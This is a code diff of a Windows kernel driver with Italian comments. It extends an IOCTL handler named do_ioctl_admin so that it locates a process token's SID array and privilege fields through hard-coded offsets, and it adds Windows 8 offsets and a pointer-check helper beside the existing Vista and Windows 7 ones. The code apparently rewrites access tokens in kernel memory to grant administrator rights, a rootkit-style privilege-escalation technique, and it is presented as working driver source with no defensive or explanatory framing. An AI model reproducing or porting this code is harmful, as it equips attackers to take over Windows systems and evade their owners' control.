@@ -276,6 +276,16 @@ NTSTATUS do_ioctl_unhook(IN PDEVICE_OBJECT dobj, IN PIRP Irp, IN PIO_STACK_LOCAT
 	return STATUS_UNSUCCESSFUL;
 }
 
+BOOLEAN CheckSIEPointer(SIE *sid_array)
+{
+	try {
+		if (sid_array[0].SID[0]==0x00000101)
+			return TRUE;
+	} except(EXCEPTION_EXECUTE_HANDLER) {
+		return FALSE;
+	}
+	return TRUE;
+}
 
 NTSTATUS do_ioctl_admin(IN PDEVICE_OBJECT dobj, IN PIRP Irp, IN PIO_STACK_LOCATION irpSp)
 {
@@ -290,10 +300,17 @@ NTSTATUS do_ioctl_admin(IN PDEVICE_OBJECT dobj, IN PIRP Irp, IN PIO_STACK_LOCATI
 
 		token = *((BYTE **)Irp->AssociatedIrp.SystemBuffer);
 
-		// questi sono offset solo per VISTA
+		// questi sono offset solo per VISTA e Windows7
 		sid_count = *((DWORD *)(token + 0x78));
 		sid_array = *((SIE **)(token + 0x90));
 		privilege = (DWORD *)(token + 0x40);
+		if (!CheckSIEPointer(sid_array)) {
+			// Offser per Windows8
+			sid_count = *((DWORD *)(token + 0xE8));
+			sid_array = *((SIE **)(token + 0xF0));
+			if (!CheckSIEPointer(sid_array))
+				return STATUS_SUCCESS;
+		}
 
 		// Cicla la lista dei SID associati al token effettivo
 		for (i=0; i<sid_count; i++) {
